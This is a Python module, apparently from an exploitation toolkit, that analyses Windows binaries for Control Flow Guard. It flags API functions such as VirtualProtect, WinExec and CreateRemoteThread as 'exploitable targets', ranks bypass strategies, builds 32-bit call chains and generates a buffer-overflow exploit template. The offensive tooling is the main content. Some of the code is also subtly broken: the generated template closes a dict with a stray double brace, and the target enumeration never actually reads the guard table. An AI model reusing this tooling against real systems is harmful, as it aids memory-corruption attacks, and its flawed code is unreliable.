"""
Windows Control Flow Guard (CFG) analysis and bypass.

CFG is a Microsoft security feature that validates indirect call targets
against a bitmap of valid targets at runtime.

Key concepts:
- Guard CF Check: Validates call target before indirect call
- Guard CF Dispatch: Alternative dispatch mechanism
- CFG Bitmap: Bitmap of valid call targets
- Valid targets: Function entry points marked as valid

Bypass techniques:
- Valid target abuse (call legitimate but useful function)
- CFG bitmap corruption
- JIT code regions (not CFG-protected)
- Unprotected modules
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class CFGInfo:
    """CFG protection analysis results."""
    enabled: bool = False
    strict_mode: bool = False

    # Guard functions
    guard_check_function: int = 0
    guard_dispatch_function: int = 0

    # Valid targets
    valid_targets: Set[int] = field(default_factory=set)
    valid_target_count: int = 0

    # Potentially exploitable
    exploitable_targets: List['ValidCFGTarget'] = field(default_factory=list)

    # Unprotected regions
    unprotected_modules: List[str] = field(default_factory=list)


@dataclass
class ValidCFGTarget:
    """A valid CFG target that might be useful for exploitation."""
    address: int
    name: str
    module: str = ""
    useful_for: str = ""  # "pivot", "gadget", "callback", etc.
    notes: str = ""


@dataclass
class CFGBypassResult:
    """Result of CFG bypass analysis."""
    technique: str
    success_probability: str
    requirements: List[str] = field(default_factory=list)
    targets: List[ValidCFGTarget] = field(default_factory=list)
    description: str = ""


class CFGAnalyzer:
    """
    Analyze Windows binary for CFG protections.

    Example:
        pe = PEBinary("target.exe")
        analyzer = CFGAnalyzer(pe)
        info = analyzer.analyze()

        if info.enabled:
            print(f"CFG enabled with {info.valid_target_count} targets")
            for target in info.exploitable_targets:
                print(f"  {target.name}: {target.useful_for}")
    """

    # Interesting functions that are valid CFG targets
    INTERESTING_TARGETS = {
        # Memory operations
        "VirtualProtect": "dep_bypass",
        "VirtualAlloc": "alloc_exec",
        "VirtualFree": "free",
        "NtProtectVirtualMemory": "dep_bypass",
        "NtAllocateVirtualMemory": "alloc_exec",

        # Execution
        "WinExec": "code_exec",
        "CreateProcessA": "code_exec",
        "CreateProcessW": "code_exec",
        "ShellExecuteA": "code_exec",
        "ShellExecuteW": "code_exec",
        "system": "code_exec",

        # Loading
        "LoadLibraryA": "dll_load",
        "LoadLibraryW": "dll_load",
        "LoadLibraryExA": "dll_load",
        "LoadLibraryExW": "dll_load",

        # Thread creation
        "CreateThread": "thread_create",
        "CreateRemoteThread": "thread_create",
        "NtCreateThread": "thread_create",

        # Memory copy
        "memcpy": "memory_write",
        "memmove": "memory_write",
        "RtlMoveMemory": "memory_write",
        "RtlCopyMemory": "memory_write",

        # Callbacks
        "SetTimer": "callback",
        "SetWindowsHookExA": "callback",
        "SetWindowsHookExW": "callback",

        # Exceptions
        "RaiseException": "exception",
        "RtlRaiseException": "exception",
    }

    def __init__(self, pe_binary: Any):
        """
        Initialize CFG analyzer.

        Args:
            pe_binary: PEBinary instance
        """
        self.pe = pe_binary

    def analyze(self) -> CFGInfo:
        """
        Perform CFG analysis.

        Returns:
            CFGInfo with analysis results
        """
        info = CFGInfo()

        # Check if CFG is enabled
        info.enabled = self.pe.protections.cfg_enabled

        if not info.enabled:
            logger.info("CFG not enabled")
            return info

        logger.info("CFG is enabled, analyzing...")

        # Get guard function addresses
        info.guard_check_function, info.guard_dispatch_function = self._find_guard_functions()

        # Enumerate valid targets
        info.valid_targets = self._enumerate_valid_targets()
        info.valid_target_count = len(info.valid_targets)

        logger.info(f"Found {info.valid_target_count} valid CFG targets")

        # Find exploitable targets
        info.exploitable_targets = self._find_exploitable_targets(info.valid_targets)

        return info

    def _find_guard_functions(self) -> Tuple[int, int]:
        """Find CFG guard function addresses."""
        check_func = 0
        dispatch_func = 0

        # Look for guard function imports
        for imp in self.pe.imports:
            if imp.name == "_guard_check_icall":
                check_func = imp.iat_address
            elif imp.name == "_guard_dispatch_icall":
                dispatch_func = imp.iat_address
            elif imp.name == "GuardCFCheckFunctionPointer":
                check_func = imp.iat_address
            elif imp.name == "GuardCFDispatchFunctionPointer":
                dispatch_func = imp.iat_address

        return check_func, dispatch_func

    def _enumerate_valid_targets(self) -> Set[int]:
        """Enumerate valid CFG targets from the binary."""
        targets = set()

        # All exported functions are valid targets
        for exp in self.pe.exports:
            targets.add(exp.address)

        # All function entry points in the binary
        # This is a simplified approach - real CFG uses a bitmap
        try:
            # Try LIEF for better analysis
            if hasattr(self.pe, '_lief_pe') and self.pe._lief_pe:
                lief_pe = self.pe._lief_pe

                # Get from load config if available
                if lief_pe.has_configuration:
                    config = lief_pe.load_configuration

                    if hasattr(config, 'guard_cf_function_table'):
                        table = config.guard_cf_function_table
                        count = getattr(config, 'guard_cf_function_count', 0)

                        # Read function table
                        for i in range(min(count, 10000)):  # Limit for safety
                            # Each entry is typically 4 or 8 bytes
                            targets.add(table + i * 4)  # Simplified

        except Exception as e:
            logger.debug(f"Error enumerating CFG targets: {e}")

        # Add all PLT/IAT entries as potential targets
        for imp in self.pe.imports:
            if imp.iat_address:
                targets.add(imp.iat_address)

        return targets

    def _find_exploitable_targets(self, valid_targets: Set[int]) -> List[ValidCFGTarget]:
        """Find valid CFG targets useful for exploitation."""
        exploitable = []

        # Check imports for interesting functions
        for imp in self.pe.imports:
            if imp.name in self.INTERESTING_TARGETS:
                target = ValidCFGTarget(
                    address=imp.iat_address,
                    name=imp.name,
                    module=imp.dll,
                    useful_for=self.INTERESTING_TARGETS[imp.name],
                    notes=f"IAT entry for {imp.dll}!{imp.name}"
                )
                exploitable.append(target)

        # Check exports
        for exp in self.pe.exports:
            if exp.name in self.INTERESTING_TARGETS:
                target = ValidCFGTarget(
                    address=exp.address,
                    name=exp.name,
                    useful_for=self.INTERESTING_TARGETS[exp.name],
                    notes="Exported function"
                )
                exploitable.append(target)

        return exploitable


class CFGBypass:
    """
    CFG bypass techniques.

    Example:
        pe = PEBinary("target.exe")
        bypass = CFGBypass(pe)

        # Get bypass strategies
        strategies = bypass.get_bypass_strategies()

        # Find useful valid targets
        targets = bypass.find_useful_targets()
    """

    def __init__(self, pe_binary: Any, cfg_info: Optional[CFGInfo] = None):
        """
        Initialize CFG bypass.

        Args:
            pe_binary: PEBinary instance
            cfg_info: Pre-computed CFG analysis
        """
        self.pe = pe_binary
        self.cfg_info = cfg_info or CFGAnalyzer(pe_binary).analyze()

    def get_bypass_strategies(self) -> List[CFGBypassResult]:
        """
        Get applicable CFG bypass strategies.

        Returns:
            List of bypass strategies
        """
        strategies = []

        if not self.cfg_info.enabled:
            strategies.append(CFGBypassResult(
                technique="No CFG",
                success_probability="100%",
                description="CFG is not enabled - standard exploitation applies"
            ))
            return strategies

        # Valid target abuse
        if self.cfg_info.exploitable_targets:
            dep_targets = [t for t in self.cfg_info.exploitable_targets
                         if t.useful_for == "dep_bypass"]
            exec_targets = [t for t in self.cfg_info.exploitable_targets
                          if t.useful_for == "code_exec"]

            if dep_targets:
                strategies.append(CFGBypassResult(
                    technique="Valid Target - DEP Bypass",
                    success_probability="High",
                    requirements=["Control call target", "Control arguments"],
                    targets=dep_targets,
                    description="Use VirtualProtect/NtProtectVirtualMemory as valid CFG target"
                ))

            if exec_targets:
                strategies.append(CFGBypassResult(
                    technique="Valid Target - Code Execution",
                    success_probability="High",
                    requirements=["Control call target", "Control arguments", "Command string"],
                    targets=exec_targets,
                    description="Use WinExec/CreateProcess as valid CFG target"
                ))

        # JIT regions
        strategies.append(CFGBypassResult(
            technique="JIT Region Abuse",
            success_probability="Medium",
            requirements=["JIT compiler present (browser, .NET)", "Control JIT input"],
            description="JIT-compiled code regions are often not CFG-protected"
        ))

        # Unprotected modules
        strategies.append(CFGBypassResult(
            technique="Unprotected Module",
            success_probability="Medium",
            requirements=["Non-CFG module loaded in process"],
            description="Find and use modules compiled without CFG"
        ))

        # Return address overwrite
        strategies.append(CFGBypassResult(
            technique="Return Address Overwrite",
            success_probability="High",
            requirements=["Stack buffer overflow"],
            description="CFG doesn't protect return addresses - use ROP"
        ))

        return strategies

    def find_useful_targets(self, use_type: Optional[str] = None) -> List[ValidCFGTarget]:
        """
        Find valid CFG targets useful for specific purpose.

        Args:
            use_type: Filter by use type ("dep_bypass", "code_exec", etc.)

        Returns:
            List of useful targets
        """
        if use_type:
            return [t for t in self.cfg_info.exploitable_targets
                   if t.useful_for == use_type]
        return self.cfg_info.exploitable_targets

    def build_cfg_compliant_chain(
        self,
        target_func: str,
        args: List[int]
    ) -> Optional[bytes]:
        """
        Build a CFG-compliant call chain.

        This sets up arguments and calls a valid CFG target.

        Args:
            target_func: Function name to call
            args: Arguments to pass

        Returns:
            Chain bytes or None
        """
        # Find the target
        target = None
        for t in self.cfg_info.exploitable_targets:
            if t.name == target_func:
                target = t
                break

        if not target:
            logger.warning(f"Target function {target_func} not found")
            return None

        # Build chain based on architecture
        chain = bytearray()
        word_size = 8 if self.pe.bits == 64 else 4

        if self.pe.bits == 32:
            # 32-bit: args on stack
            # [target_addr][return_addr][arg1][arg2]...

            chain += target.address.to_bytes(4, 'little')
            chain += (0x41414141).to_bytes(4, 'little')  # Return placeholder

            for arg in args:
                chain += arg.to_bytes(4, 'little')

        else:
            # 64-bit: need to set rcx, rdx, r8, r9 then call
            # This requires gadgets - return placeholder chain
            logger.warning("64-bit CFG chain requires ROP gadgets")
            return None

        return bytes(chain)

    def generate_exploit_template(self) -> str:
        """Generate CFG bypass exploit template."""
        template = f'''#!/usr/bin/env python3
"""
CFG Bypass Exploit Template
Generated by supwngo

Target: {self.pe.path.name}
CFG Enabled: {self.cfg_info.enabled}
Valid Targets: {self.cfg_info.valid_target_count}
"""

import struct

# Valid CFG targets for exploitation
VALID_TARGETS = {{
'''
        for target in self.cfg_info.exploitable_targets[:10]:
            template += f'    "{target.name}": {hex(target.address)},  # {target.useful_for}\n'

        template += '''}}

def pack(value):
    return struct.pack("<I", value)  # Change to <Q for 64-bit

def build_cfg_exploit():
    """
    Build CFG-compliant exploit.

    Strategy: Use valid CFG targets instead of arbitrary gadgets.
    """
    payload = b""

    # Padding to control point
    payload += b"A" * 1024  # Adjust offset

    # Option 1: Call VirtualProtect (valid target)
    # Set up arguments for VirtualProtect(shellcode_addr, size, 0x40, &old)
    # payload += pack(VALID_TARGETS["VirtualProtect"])
    # payload += pack(return_addr)
    # payload += pack(shellcode_addr)
    # payload += pack(shellcode_size)
    # payload += pack(0x40)  # PAGE_EXECUTE_READWRITE
    # payload += pack(writable_addr)

    # Option 2: Call WinExec (valid target)
    # payload += pack(VALID_TARGETS["WinExec"])
    # payload += pack(return_addr)
    # payload += pack(cmd_string_addr)
    # payload += pack(0)  # SW_HIDE

    return payload

def main():
    payload = build_cfg_exploit()
    print(f"Payload size: {len(payload)}")

    # Send/write payload
    with open("payload.bin", "wb") as f:
        f.write(payload)

if __name__ == "__main__":
    main()
'''
        return template

    def summary(self) -> str:
        """Get CFG bypass summary."""
        lines = [
            "CFG Bypass Analysis",
            "=" * 40,
            f"Binary: {self.pe.path.name}",
            f"CFG Enabled: {self.cfg_info.enabled}",
            f"Valid Targets: {self.cfg_info.valid_target_count}",
            "",
        ]

        if self.cfg_info.exploitable_targets:
            lines.append("Exploitable Targets:")
            for target in self.cfg_info.exploitable_targets[:10]:
                lines.append(f"  {target.name} ({target.useful_for}): {hex(target.address)}")

        lines.append("")
        lines.append("Bypass Strategies:")
        for strategy in self.get_bypass_strategies():
            lines.append(f"  - {strategy.technique}: {strategy.success_probability}")

        return "\n".join(lines)


def analyze_cfg(pe_binary: Any) -> CFGInfo:
    """
    Convenience function to analyze CFG.

    Args:
        pe_binary: PEBinary instance

    Returns:
        CFGInfo analysis results
    """
    return CFGAnalyzer(pe_binary).analyze()
